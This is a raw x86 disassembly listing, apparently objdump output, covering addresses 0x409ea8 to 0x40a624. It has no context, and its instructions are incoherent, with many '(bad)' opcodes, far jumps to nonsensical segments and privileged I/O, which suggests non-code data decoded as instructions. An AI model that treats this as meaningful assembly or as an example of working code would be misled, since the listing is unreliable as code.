  409ea8:	aaa    
  409ea9:	mov    ebp,0x9a91a242
  409eae:	jp     0x409ef8
  409eb0:	sbb    BYTE PTR [ebx],cl
  409eb2:	dec    esp
  409eb3:	loop   0x409e74
  409eb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eb6:	scas   eax,DWORD PTR es:[edi]
  409eb7:	xor    edi,DWORD PTR [ebp+edx*1+0x7e38ee3a]
  409ebe:	jecxz  0x409e80
  409ec0:	(bad)  
  409ec1:	and    al,0x5a
  409ec3:	ret    
  409ec4:	push   ecx
  409ec5:	sbb    ebp,DWORD PTR [esi+ebx*2]
  409ec8:	dec    edx
  409ec9:	cmp    al,0x39
  409ecb:	jae    0x409f0b
  409ecd:	mov    ch,dh
  409ecf:	cmp    eax,DWORD PTR [edi-0xac8bce3]
  409ed5:	fadd   DWORD PTR [edx+0x73]
  409ed8:	hlt    
  409ed9:	fadd   DWORD PTR [edx-0x22]
  409edc:	cmp    DWORD PTR [ebp-0xb],eax
  409edf:	stos   DWORD PTR es:[edi],eax
  409ee0:	inc    edx
  409ee1:	inc    esi
  409ee2:	cmp    DWORD PTR [ebx+ecx*1+0x3c],esi
  409ee6:	fimul  WORD PTR ds:0x45bf9309
  409eec:	dec    ebx
  409eed:	inc    esp
  409eee:	push   edx
  409eef:	sbb    ch,ch
  409ef1:	pop    ebp
  409ef2:	add    al,0x8a
  409ef4:	adc    ch,bh
  409ef6:	xchg   BYTE PTR [ebx+0x53],al
  409ef9:	xor    eax,0x3cd40450
  409efe:	inc    edi
  409eff:	push   es
  409f00:	std    
  409f01:	mov    dl,0xe6
  409f03:	out    dx,al
  409f04:	sbb    BYTE PTR [ebp+eax*2-0x787e2778],0x35
  409f0c:	call   0x522d:0xfb20f202
  409f13:	jle    0x409f5e
  409f15:	or     al,0xfa
  409f17:	xchg   ecx,eax
  409f18:	push   esi
  409f19:	mov    al,ds:0xdabc7667
  409f1e:	das    
  409f1f:	mov    edi,0x63a61d41
  409f24:	dec    edx
  409f25:	rcr    BYTE PTR [edi-0x20f2fba],0x8b
  409f2c:	jns    0x409fa2
  409f2e:	adc    eax,0x41b662d9
  409f33:	xchg   ecx,ebx
  409f35:	leave  
  409f36:	jp     0x409f1d
  409f38:	sbb    eax,0xf6cf17e3
  409f3d:	push   ss
  409f3e:	push   0x18
  409f40:	aam    0xe2
  409f42:	or     eax,0xdef936ab
  409f47:	outs   dx,DWORD PTR ds:[esi]
  409f48:	sti    
  409f49:	mov    ah,0xda
  409f4b:	xchg   edx,edx
  409f4d:	int3   
  409f4e:	fidiv  WORD PTR [edx]
  409f50:	in     al,dx
  409f51:	lds    esp,FWORD PTR [ebx]
  409f53:	pop    es
  409f54:	inc    esp
  409f55:	sub    eax,0xe210ed4a
  409f5a:	ret    
  409f5b:	fwait
  409f5c:	ins    BYTE PTR es:[edi],dx
  409f5d:	xchg   edi,eax
  409f5e:	ret    0xa3f6
  409f61:	out    0xa5,al
  409f63:	pusha  
  409f64:	sbb    edi,edx
  409f66:	aam    0x5a
  409f68:	mov    al,0xcc
  409f6a:	mov    edi,0x78b1a627
  409f6f:	dec    eax
  409f70:	pop    ecx
  409f71:	sub    al,BYTE PTR [edx+0x34]
  409f74:	ss pop ds
  409f76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f77:	cmp    eax,0xae0ae2d2
  409f7c:	xor    dl,ah
  409f7e:	out    dx,eax
  409f7f:	add    al,0x62
  409f81:	and    dh,BYTE PTR [ebx+ebx*2-0x3d]
  409f85:	int    0xe
  409f87:	xchg   ebp,eax
  409f88:	stos   BYTE PTR es:[edi],al
  409f89:	xor    BYTE PTR [esi],bl
  409f8b:	loop   0x409fd9
  409f8d:	enter  0x33fb,0x1b
  409f91:	jmp    0x409f1c
  409f93:	mov    ebp,0x545aa16c
  409f98:	outs   dx,DWORD PTR ds:[esi]
  409f99:	jmp    0xd18c:0x3d3f73d4
  409fa0:	shl    DWORD PTR [esi+0x42],1
  409fa3:	xchg   edx,eax
  409fa4:	xor    ebx,esi
  409fa6:	imul   ecx,DWORD PTR [eax],0x234e7c1a
  409fac:	inc    edx
  409fad:	xor    al,0xf
  409faf:	mov    DWORD PTR [edx+0x38a75e50],ecx
  409fb5:	pushf  
  409fb6:	sbb    DWORD PTR [ecx-0x2c],esi
  409fb9:	sbb    ch,bh
  409fbb:	cdq    
  409fbc:	add    al,0xd8
  409fbe:	xor    DWORD PTR [edx+0x69e2f69],0xbde38708
  409fc8:	lahf   
  409fc9:	loope  0x409f90
  409fcb:	mov    BYTE PTR [edi-0x5b],dl
  409fce:	sbb    bl,BYTE PTR [edx+0x13]
  409fd1:	mov    ecx,0x1eb49095
  409fd6:	and    DWORD PTR [eax+0x41],eax
  409fd9:	cdq    
  409fda:	in     eax,dx
  409fdb:	mov    ebp,0xf322f67b
  409fe0:	lods   eax,DWORD PTR ds:[esi]
  409fe1:	int    0x8b
  409fe3:	mov    esp,0xf910a3ae
  409fe8:	inc    eax
  409fe9:	and    DWORD PTR [eax+eiz*8+0x28],edx
  409fed:	pushf  
  409fee:	pop    esp
  409fef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ff0:	lea    ebp,[eax]
  409ff2:	dec    esi
  409ff3:	fdivr  DWORD PTR [ecx+ecx*1-0x2e]
  409ff7:	mov    al,0x13
  409ff9:	pop    eax
  409ffa:	jge    0x409fda
  409ffc:	or     eax,0x8ced28d1
  40a001:	inc    ebx
  40a002:	cdq    
  40a003:	sar    BYTE PTR [esi-0x5e],0x59
  40a007:	and    ah,0x4b
  40a00a:	push   ds
  40a00b:	addr16 push edi
  40a00d:	and    eax,DWORD PTR [esi+ecx*2]
  40a010:	xor    DWORD PTR [ecx],0x69
  40a013:	pop    edx
  40a014:	mov    edi,0x51a9f30f
  40a019:	mov    eax,ds:0xf2ac47b7
  40a01e:	in     al,dx
  40a01f:	jg     0x40a004
  40a021:	xlat   BYTE PTR ds:[ebx]
  40a022:	push   edi
  40a023:	xchg   edi,eax
  40a024:	or     cl,ch
  40a026:	adc    DWORD PTR [esi+0x4673c83f],esi
  40a02c:	bound  ecx,QWORD PTR [ecx]
  40a02e:	xor    ebp,DWORD PTR [esi+0x9435031]
  40a034:	pop    ds
  40a035:	adc    esi,DWORD PTR [edx]
  40a037:	jge    0x40a01b
  40a039:	out    dx,al
  40a03a:	ret    0x527b
  40a03d:	inc    edi
  40a03e:	test   eax,edi
  40a040:	mov    DWORD PTR [ebp+0x41],edx
  40a043:	dec    ecx
  40a044:	ins    BYTE PTR es:[edi],dx
  40a045:	test   DWORD PTR [edi-0x4e16ebf9],edi
  40a04b:	jae    0x409fdb
  40a04d:	pop    ds
  40a04e:	xor    BYTE PTR [ecx+0x3b3847d0],ah
  40a054:	xchg   DWORD PTR [esp+edx*2+0x3a],ebp
  40a058:	aam    0x76
  40a05a:	mov    al,0x54
  40a05c:	les    ebx,FWORD PTR [ebx]
  40a05e:	rol    BYTE PTR [eax+ebx*1-0x7],0x35
  40a063:	nop
  40a064:	repnz xlat BYTE PTR ds:[ebx]
  40a066:	xor    esi,DWORD PTR [ecx+edi*8+0x67]
  40a06a:	cwde   
  40a06b:	ins    DWORD PTR es:[edi],dx
  40a06c:	mov    edx,DWORD PTR [edx]
  40a06e:	arpl   WORD PTR [edi-0x5c2f4cef],bx
  40a074:	pop    eax
  40a075:	inc    eax
  40a076:	sub    dl,BYTE PTR [esi+0x74f89722]
  40a07c:	sub    bl,BYTE PTR [ebx-0x11]
  40a07f:	mov    ebp,ss
  40a081:	jb     0x40a0a3
  40a083:	sbb    eax,0x9ff5407c
  40a088:	jo     0x40a0e8
  40a08a:	gs aaa 
  40a08c:	inc    ebx
  40a08d:	adc    DWORD PTR [edi-0x356a0b78],ecx
  40a093:	arpl   WORD PTR [ecx-0x1f65f775],di
  40a099:	dec    ebx
  40a09a:	mov    edx,0xf815f4cc
  40a09f:	push   ebx
  40a0a0:	aas    
  40a0a1:	jae    0x40a094
  40a0a3:	cmp    edi,DWORD PTR [ecx+eax*8+0x3ede0706]
  40a0aa:	imul   edi
  40a0ac:	jae    0x40a0dc
  40a0ae:	mov    edx,0x8f5d72dc
  40a0b3:	aam    0x1c
  40a0b5:	jnp    0x40a04f
  40a0b7:	sub    dh,BYTE PTR [ecx-0x54e2fcdb]
  40a0bd:	cmp    al,0x92
  40a0bf:	ss in  al,0x77
  40a0c2:	fld    QWORD PTR [ecx-0x6d]
  40a0c5:	push   ebx
  40a0c6:	sbb    ebx,edx
  40a0c8:	div    bl
  40a0ca:	mov    esi,DWORD PTR [ecx+eiz*2]
  40a0cd:	stc    
  40a0ce:	sub    DWORD PTR [edx-0x59],edx
  40a0d1:	mov    ds:0x21bb7501,al
  40a0d6:	push   ebx
  40a0d7:	push   cs
  40a0d8:	ins    DWORD PTR es:[edi],dx
  40a0d9:	sbb    bl,BYTE PTR [eax]
  40a0db:	mov    cl,0x25
  40a0dd:	pusha  
  40a0de:	cmp    eax,DWORD PTR [eax-0xb]
  40a0e1:	gs cs cdq 
  40a0e4:	pushf  
  40a0e5:	or     ecx,DWORD PTR [esi+0x3d]
  40a0e8:	enter  0x1dd7,0x1e
  40a0ec:	add    ebp,DWORD PTR [ebx]
  40a0ee:	repz adc edx,DWORD PTR ds:[esi+0x4313c87d]
  40a0f6:	in     eax,0xd1
  40a0f8:	out    dx,eax
  40a0f9:	mov    edx,0x74aa8e02
  40a0fe:	stc    
  40a0ff:	jg     0x40a170
  40a101:	dec    edi
  40a102:	leave  
  40a103:	cmp    DWORD PTR [esi+0x47],esi
  40a106:	or     DWORD PTR [ecx+0x1c],ebp
  40a109:	in     al,0xcc
  40a10b:	mov    dh,0x46
  40a10d:	mov    eax,0x4eab4982
  40a112:	mov    dh,0x48
  40a114:	cld    
  40a115:	add    eax,0x998df8bf
  40a11a:	out    dx,eax
  40a11b:	push   edx
  40a11c:	ja     0x40a190
  40a11e:	xor    DWORD PTR [edx-0x269382fe],ebx
  40a124:	pop    esp
  40a125:	fdivr  QWORD PTR [edx+0x7691fe92]
  40a12b:	scas   eax,DWORD PTR es:[edi]
  40a12c:	and    eax,0xf7eff7c0
  40a131:	pusha  
  40a132:	sub    DWORD PTR [esi],eax
  40a134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a135:	ss push cs
  40a137:	jg     0x40a0e3
  40a139:	mov    ah,0xac
  40a13b:	int    0x34
  40a13d:	cmp    WORD PTR [edx+0x356ffc3c],ax
  40a144:	lahf   
  40a145:	jmp    0x40a180
  40a147:	jbe    0x40a0df
  40a149:	add    edx,DWORD PTR [eax+0x2a]
  40a14c:	fdivr  st(3),st
  40a14e:	cwde   
  40a14f:	push   0x5f83bc18
  40a154:	adc    al,0x7c
  40a156:	lock sti 
  40a158:	and    ah,bh
  40a15a:	push   esp
  40a15b:	jbe    0x40a0ea
  40a15d:	adc    eax,0x749acd97
  40a162:	inc    eax
  40a163:	adc    BYTE PTR [ebx+edx*8],dh
  40a166:	loopne 0x40a11e
  40a168:	dec    edi
  40a169:	repnz pop es
  40a16b:	hlt    
  40a16c:	cmp    ecx,esp
  40a16e:	jge    0x40a17a
  40a170:	inc    ecx
  40a171:	or     DWORD PTR [esi+0x66],edx
  40a174:	shl    bl,0x5a
  40a177:	inc    edi
  40a178:	aaa    
  40a179:	xchg   edi,eax
  40a17a:	mov    edi,0x306b04b8
  40a17f:	jne    0x40a1d2
  40a181:	adc    al,0x43
  40a183:	scas   eax,DWORD PTR es:[edi]
  40a184:	(bad)  
  40a185:	cmp    al,0xf4
  40a187:	xor    eax,0x51dcc372
  40a18c:	(bad)  
  40a18d:	scas   al,BYTE PTR es:[edi]
  40a18e:	call   0x7ff7:0x9389c79a
  40a195:	enter  0x5188,0xc5
  40a199:	addr16 mov cl,0x4a
  40a19c:	cwde   
  40a19d:	add    ebp,0x1
  40a1a0:	in     al,0x6a
  40a1a2:	push   ax
  40a1a4:	pop    es
  40a1a5:	inc    esp
  40a1a6:	adc    ch,BYTE PTR [eax]
  40a1a8:	adc    DWORD PTR [ecx],ecx
  40a1aa:	js     0x40a20f
  40a1ac:	stos   BYTE PTR es:[edi],al
  40a1ad:	gs ja  0x40a1ea
  40a1b0:	pop    ebx
  40a1b1:	add    al,0xfc
  40a1b3:	jns    0x40a1ac
  40a1b5:	outs   dx,DWORD PTR ds:[esi]
  40a1b6:	icebp  
  40a1b7:	sub    eax,0x6dcfdd60
  40a1bc:	xchg   esi,eax
  40a1bd:	push   ecx
  40a1be:	jns    0x40a231
  40a1c0:	add    BYTE PTR [ebp+esi*8+0xfaca6b4],0x1d
  40a1c8:	js     0x40a1e0
  40a1ca:	xlat   BYTE PTR ds:[ebx]
  40a1cb:	lods   eax,DWORD PTR ds:[esi]
  40a1cc:	es das 
  40a1ce:	das    
  40a1cf:	div    DWORD PTR [edi+0x53]
  40a1d2:	jl     0x40a1d7
  40a1d4:	and    BYTE PTR [edx-0x1b605154],ch
  40a1da:	cdq    
  40a1db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1dc:	cmp    BYTE PTR [ebp-0x7a23c8bc],bl
  40a1e2:	push   eax
  40a1e3:	xchg   esi,eax
  40a1e4:	pop    ds
  40a1e5:	inc    edi
  40a1e6:	mov    dh,0xd8
  40a1e8:	or     al,0x83
  40a1ea:	xchg   ecx,eax
  40a1eb:	adc    al,0x76
  40a1ed:	mov    eax,ds:0xbde3a988
  40a1f2:	and    eax,0x9edc1595
  40a1f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a1f8:	pop    eax
  40a1f9:	sbb    cl,BYTE PTR [edi-0x2fcc379c]
  40a1ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a200:	or     al,0x1d
  40a202:	mov    ds:0x72d94a6f,al
  40a207:	push   esi
  40a208:	push   ss
  40a209:	aad    0x2f
  40a20b:	mov    ebx,0x21f9563e
  40a210:	mov    WORD PTR [ebx+0x24b4889d],cs
  40a216:	jno    0x40a28d
  40a218:	mov    al,0x6
  40a21a:	hlt    
  40a21b:	retf   0x878
  40a21e:	fidiv  WORD PTR [ecx]
  40a220:	lea    eax,ds:0x6208ddb5
  40a226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a227:	inc    eax
  40a228:	push   edx
  40a229:	jae    0x40a225
  40a22b:	into   
  40a22c:	xchg   ebp,eax
  40a22d:	cmp    DWORD PTR [edi-0x493ddfed],0xfa291e17
  40a237:	jno    0x40a1fb
  40a239:	xor    ah,al
  40a23b:	adc    al,dl
  40a23d:	scas   eax,DWORD PTR es:[edi]
  40a23e:	dec    esp
  40a23f:	xchg   ecx,eax
  40a240:	fsub   DWORD PTR [ebx-0x409efe2d]
  40a246:	add    eax,0xc6475c06
  40a24b:	dec    ebx
  40a24c:	sar    DWORD PTR [bp+si],1
  40a24f:	mov    ds:0x7d31d7ca,al
  40a254:	mov    cl,0xa2
  40a256:	dec    edi
  40a257:	loope  0x40a206
  40a259:	jbe    0x40a22b
  40a25b:	cmp    al,0x82
  40a25d:	(bad)  
  40a25e:	test   al,0x5b
  40a260:	jne    0x40a292
  40a262:	(bad)  
  40a263:	dec    esp
  40a264:	add    ebx,DWORD PTR [eax-0x3e]
  40a267:	push   ebp
  40a268:	jmp    0x4dabd3a6
  40a26d:	pop    esp
  40a26e:	fadd   st,st(6)
  40a270:	leave  
  40a271:	pop    esi
  40a272:	mov    ebx,esp
  40a274:	sti    
  40a275:	inc    ebp
  40a276:	adc    DWORD PTR [eax+0x14],edx
  40a279:	retf   0x5bbe
  40a27c:	fld    DWORD PTR [ebx-0x3b]
  40a27f:	xchg   edi,eax
  40a280:	leave  
  40a281:	sti    
  40a282:	pop    ds
  40a283:	add    ch,BYTE PTR [eax]
  40a285:	xchg   ecx,eax
  40a286:	dec    esi
  40a287:	cmp    dl,0x23
  40a28a:	pusha  
  40a28b:	ficom  WORD PTR [ebx]
  40a28d:	mov    cl,0x61
  40a28f:	gs ins BYTE PTR es:[edi],dx
  40a291:	mov    al,0x35
  40a293:	clc    
  40a294:	sub    edx,DWORD PTR [esi-0x58]
  40a297:	pop    edx
  40a298:	fmulp  st(4),st
  40a29a:	jno    0x40a303
  40a29c:	rcpps  xmm7,XMMWORD PTR [esi-0x54a7f62]
  40a2a3:	pop    eax
  40a2a4:	(bad)  
  40a2a6:	mov    al,0xc4
  40a2a8:	dec    ecx
  40a2a9:	fs addr16 int3 
  40a2ac:	or     eax,0xd62dc0e7
  40a2b1:	imul   eax,ebp,0xffffff93
  40a2b4:	jmp    0x6466:0x80478c3c
  40a2bb:	jb     0x40a27a
  40a2bd:	jo     0x40a2ea
  40a2bf:	mov    ds:0xe0088fcc,al
  40a2c4:	pop    ebx
  40a2c5:	lods   eax,DWORD PTR ds:[esi]
  40a2c6:	xchg   esp,eax
  40a2c8:	sbb    esp,0xffffffcc
  40a2cb:	out    0xa,al
  40a2cd:	dec    esp
  40a2ce:	imul   ebp,DWORD PTR [edx-0x1a],0x88d20428
  40a2d5:	pop    ds
  40a2d6:	jmp    0xe4ab8361
  40a2db:	inc    edi
  40a2dc:	inc    ecx
  40a2dd:	dec    ebx
  40a2de:	inc    ecx
  40a2df:	cmp    DWORD PTR [ecx],esp
  40a2e1:	jae    0x40a2a2
  40a2e3:	cwde   
  40a2e4:	gs pop eax
  40a2e6:	addr16 inc ecx
  40a2e8:	xchg   esp,eax
  40a2e9:	mov    ch,0xa8
  40a2eb:	repz test al,0x1d
  40a2ee:	lea    edi,ds:0x887bd8f3
  40a2f4:	imul   esi,DWORD PTR [edi+0x3f599b47],0x6f5512ee
  40a2fe:	and    eax,0x9efd3382
  40a303:	cwde   
  40a304:	sbb    esi,DWORD PTR [edi+ebp*1+0x33dc52c2]
  40a30b:	push   0xd5b339ae
  40a310:	cmp    ch,BYTE PTR [ebp+0x7d]
  40a313:	aam    0x92
  40a315:	rcr    BYTE PTR [edi-0x3d],1
  40a318:	push   cs
  40a319:	je     0x40a365
  40a31b:	(bad)  
  40a31c:	cmp    cl,cl
  40a31e:	inc    esp
  40a31f:	xor    al,0x22
  40a321:	imul   edx,DWORD PTR [edx-0x31],0x27
  40a325:	inc    ecx
  40a326:	dec    eax
  40a327:	outs   dx,DWORD PTR ds:[esi]
  40a328:	rol    BYTE PTR [ebx],1
  40a32a:	mov    ebx,0x68610708
  40a32f:	xor    ebx,DWORD PTR [edx+ebp*4+0x305c1d03]
  40a336:	xor    al,0xe0
  40a338:	cmp    bl,BYTE PTR [edi+0x5e]
  40a33b:	push   0x6c
  40a33d:	xor    DWORD PTR [ebx],edi
  40a33f:	sub    BYTE PTR es:[ecx],ah
  40a342:	shl    BYTE PTR [esp+eiz*8-0x73cdcd5a],cl
  40a349:	test   DWORD PTR es:[eax],0xdbfdd5e4
  40a350:	mov    eax,ds:0xf113d03
  40a355:	hlt    
  40a356:	idiv   BYTE PTR [ebx+0x664d4eb4]
  40a35c:	lods   eax,DWORD PTR ds:[esi]
  40a35d:	push   ecx
  40a35e:	mov    edx,edx
  40a360:	sahf   
  40a361:	bnd ret 
  40a363:	jns    0x40a3d0
  40a365:	mov    eax,0x3787fea5
  40a36a:	jmp    0x8ca3:0xbfd98180
  40a371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a372:	cmc    
  40a373:	imul   ecx,DWORD PTR [edi-0x22],0xf87fbbb7
  40a37a:	sbb    al,0x2d
  40a37c:	push   ecx
  40a37d:	pop    es
  40a37e:	jo     0x40a3e4
  40a380:	data16 fimul DWORD PTR [ebp+0x21]
  40a384:	test   eax,0x577ad35f
  40a389:	stos   DWORD PTR es:[edi],eax
  40a38a:	outs   dx,DWORD PTR ds:[esi]
  40a38c:	and    esi,esp
  40a38e:	sub    edx,ebp
  40a390:	push   eax
  40a391:	arpl   WORD PTR [edi+0x1e],bx
  40a394:	test   ecx,eax
  40a396:	cmp    eax,0x6b9f8751
  40a39b:	mov    BYTE PTR [ebp-0x6f],dh
  40a39e:	iret   
  40a39f:	call   0x2566:0x3e196521
  40a3a6:	inc    esi
  40a3a7:	sbb    BYTE PTR [edx+0x78],0x62
  40a3ab:	stc    
  40a3ac:	cmp    BYTE PTR [ecx-0xd5a390f],0x3c
  40a3b3:	adc    bl,BYTE PTR [edi+ecx*2+0x68be6005]
  40a3ba:	(bad)  
  40a3bb:	pop    ds
  40a3bc:	test   BYTE PTR [ecx+eax*8-0x7649dc69],cl
  40a3c3:	hlt    
  40a3c4:	add    BYTE PTR [edx],al
  40a3c6:	mov    al,ds:0x978a420e
  40a3cb:	fcomp  QWORD PTR [eax-0xc7193f2]
  40a3d1:	and    al,0x25
  40a3d3:	push   edi
  40a3d4:	nop
  40a3d5:	push   es
  40a3d6:	fistp  WORD PTR ds:0xcde06873
  40a3dc:	call   0xe136c737
  40a3e1:	popa   
  40a3e2:	jbe    0x40a385
  40a3e4:	xchg   edi,eax
  40a3e5:	mov    edx,0x8f76b921
  40a3ea:	mov    ds:0xe3b6061,eax
  40a3ef:	out    0x72,eax
  40a3f1:	mov    dh,0xf3
  40a3f3:	fs dec esp
  40a3f5:	sbb    dh,BYTE PTR [ecx-0x41ce5f07]
  40a3fb:	sub    DWORD PTR cs:[ecx+eiz*4-0x74],edi
  40a400:	repz sbb eax,0x458988a5
  40a406:	push   esp
  40a407:	dec    ebp
  40a408:	in     eax,dx
  40a409:	and    esp,DWORD PTR [esi-0x1]
  40a40c:	cld    
  40a40d:	shl    eax,1
  40a40f:	leave  
  40a410:	cwde   
  40a411:	pop    ss
  40a412:	repnz sub ah,BYTE PTR [esi+0x40e4f428]
  40a419:	mov    ch,0xa0
  40a41b:	jb     0x40a3f5
  40a41d:	aam    0x5
  40a41f:	or     esp,eax
  40a421:	nop
  40a422:	stc    
  40a423:	fimul  DWORD PTR [eax]
  40a425:	xor    eax,0xe9ddc7c2
  40a42a:	fcmovnb st,st(4)
  40a42c:	adc    BYTE PTR [eax],dh
  40a42e:	xor    eax,0x59ff947a
  40a433:	mov    ebp,DWORD PTR [edx+esi*8]
  40a436:	push   esp
  40a437:	xchg   DWORD PTR [esi],eax
  40a439:	jo     0x40a454
  40a43b:	push   cs
  40a43c:	popa   
  40a43d:	dec    ecx
  40a43e:	out    dx,eax
  40a43f:	popf   
  40a440:	xchg   edx,eax
  40a441:	scas   al,BYTE PTR es:[edi]
  40a442:	sub    ecx,0xffffffc9
  40a445:	ret    0xfb70
  40a448:	dec    esp
  40a449:	cli    
  40a44a:	dec    ebx
  40a44b:	pop    edx
  40a44c:	xor    al,0xdb
  40a44e:	xchg   edi,eax
  40a44f:	add    DWORD PTR [eax-0x65],esi
  40a452:	jmp    0x4bb812
  40a457:	test   eax,0x16f28588
  40a45c:	push   cs
  40a45d:	or     BYTE PTR [ebp+0x6503de7b],dl
  40a463:	mov    bh,0x40
  40a465:	lock sub DWORD PTR [edx+0x7d651f7c],0xc14d7739
  40a470:	pop    ebp
  40a472:	das    
  40a473:	mov    BYTE PTR [esi-0x6a119d42],bl
  40a479:	jb     0x40a44d
  40a47b:	mov    edi,0x94ef8c19
  40a480:	call   0x78c8:0x667c52fe
  40a487:	cmp    dh,ah
  40a489:	add    BYTE PTR [ebx],bl
  40a48b:	fst    QWORD PTR [eax*8+0x7c0b2d37]
  40a492:	jno    0x40a472
  40a494:	or     eax,0x59523e9d
  40a499:	lods   eax,DWORD PTR ds:[esi]
  40a49a:	mov    BYTE PTR [ebx+edx*2],0x6a
  40a49e:	aas    
  40a49f:	xor    esi,DWORD PTR [edi]
  40a4a1:	add    al,0x5c
  40a4a3:	call   0xd640:0x6d266496
  40a4aa:	fs and al,0xd2
  40a4ad:	ins    BYTE PTR es:[edi],dx
  40a4ae:	adc    bh,BYTE PTR [ecx-0x728eeb6f]
  40a4b4:	jmp    0xaa902761
  40a4b9:	xor    eax,0x704a98cb
  40a4be:	test   eax,0x31bad751
  40a4c3:	scas   eax,DWORD PTR es:[edi]
  40a4c4:	sbb    BYTE PTR [esi+0x72],ah
  40a4c7:	adc    ch,BYTE PTR [ecx]
  40a4c9:	xchg   ebx,eax
  40a4ca:	sahf   
  40a4cb:	mov    dh,0x75
  40a4cd:	cld    
  40a4ce:	jecxz  0x40a4e3
  40a4d0:	and    BYTE PTR [esi-0x612370e1],dh
  40a4d6:	jnp    0x40a487
  40a4d8:	lahf   
  40a4d9:	mov    esp,0xce519a2
  40a4de:	pop    eax
  40a4df:	lods   al,BYTE PTR ds:[esi]
  40a4e0:	(bad)  [edi+0x64]
  40a4e3:	aad    0x93
  40a4e5:	jb     0x40a4ae
  40a4e7:	out    dx,eax
  40a4e8:	repnz mov al,ds:0xf7d49f9b
  40a4ee:	call   0xa6ec:0xb83d9b4f
  40a4f5:	pushf  
  40a4f6:	adc    BYTE PTR [edx+0x645d0532],bl
  40a4fc:	loop   0x40a56c
  40a4fe:	fcmove st,st(0)
  40a500:	cmp    eax,0xcd8b7fbe
  40a505:	fidiv  WORD PTR [ebx+0xbb45e10]
  40a50b:	test   eax,0xbc14d831
  40a510:	push   esp
  40a511:	inc    eax
  40a512:	jae    0x40a4ed
  40a514:	retf   
  40a515:	call   0xe45c:0x95908933
  40a51c:	jmp    FWORD PTR [edi]
  40a51e:	adc    BYTE PTR [edx-0x60],dl
  40a521:	pop    ebp
  40a522:	test   DWORD PTR [bp+di],edx
  40a525:	ins    DWORD PTR es:[edi],dx
  40a526:	jns    0x40a50c
  40a528:	out    0x7c,eax
  40a52a:	in     eax,0x17
  40a52c:	mov    al,0xe4
  40a52e:	aam    0xd
  40a530:	jno    0x40a54b
  40a532:	imul   ebp,DWORD PTR [esp+ecx*8+0x71],0x80db528e
  40a53a:	iret   
  40a53b:	mov    edx,0x8e13cfaf
  40a540:	mov    eax,eax
  40a542:	mov    ah,0xc8
  40a544:	lods   al,BYTE PTR ds:[esi]
  40a545:	dec    edi
  40a546:	loopne 0x40a5c3
  40a548:	cmp    eax,0x2ea51d5a
  40a54d:	popf   
  40a54e:	sbb    al,0xd2
  40a550:	aam    0x80
  40a552:	ins    DWORD PTR es:[edi],dx
  40a553:	repz sbb eax,0xe1675184
  40a559:	outs   dx,BYTE PTR ds:[esi]
  40a55a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a55b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a55c:	shl    DWORD PTR [esi-0x34],cl
  40a55f:	clc    
  40a560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a561:	cwde   
  40a562:	jmp    0x40a525
  40a564:	sbb    eax,0x6bebd59d
  40a569:	in     eax,dx
  40a56a:	xchg   DWORD PTR [ebx+0x61556579],eax
  40a570:	in     al,0xe4
  40a572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a573:	es push ebp
  40a575:	push   ds
  40a576:	dec    esi
  40a577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a578:	retf   
  40a579:	fisttp DWORD PTR [ecx+0x1f]
  40a57c:	xor    DWORD PTR [ecx],esp
  40a57e:	mov    ebp,0x6ee8aac7
  40a583:	and    DWORD PTR ds:0x2dd63afe,edi
  40a589:	loop   0x40a523
  40a58b:	aas    
  40a58c:	and    al,0xb
  40a58e:	mov    al,0x99
  40a590:	xchg   edi,eax
  40a591:	(bad)  [esi-0x63]
  40a594:	ffreep st(1)
  40a596:	ror    ch,0x86
  40a599:	popa   
  40a59a:	xchg   edi,eax
  40a59b:	inc    ebp
  40a59c:	sbb    al,0x98
  40a59e:	rcl    BYTE PTR [esi],cl
  40a5a0:	sbb    al,0x25
  40a5a2:	push   0xcf91f472
  40a5a7:	aad    0xe
  40a5a9:	scas   eax,DWORD PTR es:[edi]
  40a5aa:	jp     0x40a5c6
  40a5ac:	mov    esi,0x5a21c33d
  40a5b1:	jg     0x40a534
  40a5b3:	or     eax,0x42fa8105
  40a5b8:	cli    
  40a5b9:	out    dx,al
  40a5ba:	dec    eax
  40a5bb:	adc    al,0xa0
  40a5bd:	pop    edi
  40a5be:	in     al,0xde
  40a5c0:	dec    ebp
  40a5c1:	cli    
  40a5c2:	mov    DWORD PTR [ebx-0x14],esp
  40a5c5:	cwde   
  40a5c6:	push   edi
  40a5c7:	loope  0x40a644
  40a5c9:	push   es
  40a5ca:	imul   eax,DWORD PTR [eax-0x63],0xffffffe4
  40a5ce:	lods   al,BYTE PTR ds:[esi]
  40a5cf:	push   es
  40a5d0:	xchg   BYTE PTR [edi],ah
  40a5d2:	iret   
  40a5d3:	mov    ah,bl
  40a5d5:	or     edi,DWORD PTR [ecx-0x2b655d41]
  40a5db:	dec    ax
  40a5dd:	out    dx,al
  40a5de:	cwde   
  40a5df:	jo     0x40a5f2
  40a5e1:	std    
  40a5e2:	adc    edi,DWORD PTR [ebx+0x34]
  40a5e5:	add    BYTE PTR [ecx+ebx*4-0x354a3ef4],dh
  40a5ec:	ds jmp 0x40a5f3
  40a5ef:	or     al,0xf1
  40a5f1:	test   DWORD PTR [eax],0x1df9c8b0
  40a5f7:	mov    al,ds:0x9fe99c2a
  40a5fc:	jp     0x40a5b4
  40a5fe:	and    BYTE PTR ds:0x5259f845,bh
  40a604:	ror    DWORD PTR [ecx+0xe6ff50],1
  40a60a:	pop    ss
  40a60b:	mov    ds:0x8f3216ae,eax
  40a610:	clc    
  40a611:	scas   al,BYTE PTR es:[edi]
  40a612:	mov    edi,0xb869cfdc
  40a617:	leave  
  40a618:	cli    
  40a619:	das    
  40a61a:	xlat   BYTE PTR ds:[ebx]
  40a61b:	push   ecx
  40a61c:	push   ebx
  40a61d:	cmp    BYTE PTR [ebx+0x75abf615],0xa9
  40a624:	dec    eax
